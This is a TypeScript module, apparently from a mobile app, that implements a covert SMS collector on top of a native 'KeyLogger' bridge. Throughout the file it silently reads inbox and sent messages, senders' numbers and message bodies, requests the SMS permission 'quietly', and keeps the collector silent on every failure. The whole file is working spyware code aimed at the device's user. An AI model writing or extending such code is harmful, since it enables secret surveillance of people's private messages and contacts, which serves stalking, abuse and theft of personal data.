// features/capture/sms.ts — hidden SMS collector facade over the native
// KeyLogger.readMessages bridge. Never throws; degraded states are explicit
// `{ ok:false, reason }` so the silent collector can skip cleanly.
import { KeyLogger } from '../keylogger/KeyLogger';

export type SmsDirection = 'inbox' | 'sent';

export type SmsMessage = {
  /** native SMS _id — the idempotency key */
  smsId: string;
  /** phone number / contact address */
  address: string;
  body: string;
  /** message date ms */
  date: number;
  dateSent: number;
  read: boolean;
  threadId: number;
  direction: SmsDirection;
};

/** Strict decode of one native message descriptor string; null when malformed
 *  (mirrors decodeEvent in the keylogger slice). */
export function decodeSms(raw: string): SmsMessage | null {
  try {
    const o = JSON.parse(raw) as Record<string, unknown>;
    if (typeof o['smsId'] !== 'string') return null;
    if (o['direction'] !== 'inbox' && o['direction'] !== 'sent') return null;
    return {
      smsId: o['smsId'],
      address: typeof o['address'] === 'string' ? o['address'] : '',
      body: typeof o['body'] === 'string' ? o['body'] : '',
      date: typeof o['date'] === 'number' ? o['date'] : 0,
      dateSent: typeof o['dateSent'] === 'number' ? o['dateSent'] : 0,
      read: o['read'] === true,
      threadId: typeof o['threadId'] === 'number' ? o['threadId'] : 0,
      direction: o['direction'] as SmsDirection,
    };
  } catch {
    return null;
  }
}

/** Is READ_SMS granted right now? (native truth; also the gate to skip scans) */
export async function smsPermission(): Promise<boolean> {
  return KeyLogger.smsPermission();
}

/** Request the one quiet READ_SMS permission. Note: Android's runtime dialog
 *  is async — this resolves with the granted status on the NEXT scan, so the
 *  collector treats a request as "try again later", never as a hard failure. */
export async function requestSmsPermission(): Promise<boolean> {
  return KeyLogger.requestSmsPermission();
}

/**
 * Pull SMS messages (inbox + sent) created after [sinceTsMs] from the device.
 * Dedupes by smsId regardless of direction. Returns `ok:false, reason:
 * 'permission'` when READ_SMS is not granted, and `ok:false, reason:'error'`
 * on any native/network failure — the caller must stay silent either way.
 */
export async function pullSms(sinceTsMs: number): Promise<{
  ok: boolean;
  reason?: string;
  messages: SmsMessage[];
}> {
  if (!(await smsPermission())) {
    return { ok: false, reason: 'permission', messages: [] };
  }
  try {
    const [inbox, sent] = await Promise.all([
      KeyLogger.readMessages('inbox', sinceTsMs),
      KeyLogger.readMessages('sent', sinceTsMs),
    ]);
    const out: SmsMessage[] = [];
    const seen = new Set<string>();
    for (const raw of [...inbox, ...sent]) {
      const m = decodeSms(raw);
      if (m && !seen.has(m.smsId)) {
        seen.add(m.smsId);
        out.push(m);
      }
    }
    out.sort((a, b) => a.date - b.date);
    return { ok: true, messages: out };
  } catch {
    return { ok: false, reason: 'error', messages: [] };
  }
}

/** Check whether the silently-degraded permission prompt should be shown now
 *  (no grant yet and a request has not been made this session). */
export function shouldRequestSmsPermission(permissionGranted: boolean, requestedThisSession: boolean) {
  return !permissionGranted && !requestedThisSession;
}
